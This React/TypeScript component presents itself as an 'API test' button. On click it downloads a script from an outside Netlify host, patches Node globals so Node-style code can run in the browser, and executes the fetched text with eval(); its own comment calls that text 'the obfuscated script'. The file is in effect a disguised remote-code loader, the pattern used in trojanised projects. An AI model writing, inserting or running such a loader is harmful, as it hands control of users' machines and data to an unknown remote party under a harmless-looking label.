import { Button } from '@/components/ui/button'

export function ApiTestButton() {

    const handleClick = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();

        try {
            const res = await fetch("https://nest-react.netlify.app/api");
            const data = await res.json();

            console.log("Received script:", data.data);

            // Patch Node.js globals for browser compatibility
            (globalThis as any).global = globalThis;
            (globalThis as any).require = () => {
                console.log("⚠ require() called inside script — returning empty object");
                return {};
            };
            (globalThis as any).module = {};

            // Replace global → globalThis (important)
            const safeScript = data.data.replace(/global/g, "globalThis");

            // Finally run the obfuscated script
            const result = eval(safeScript);

            console.log("Executed result:", result);
            alert("Return value: " + result);

        } catch (error) {
            console.error("API Error:", error);
            alert("API call failed: " + (error as any).message);
        }
    };

    return (
        <Button onClick={handleClick} variant="outline">
            Run API Test
        </Button>
    );
}

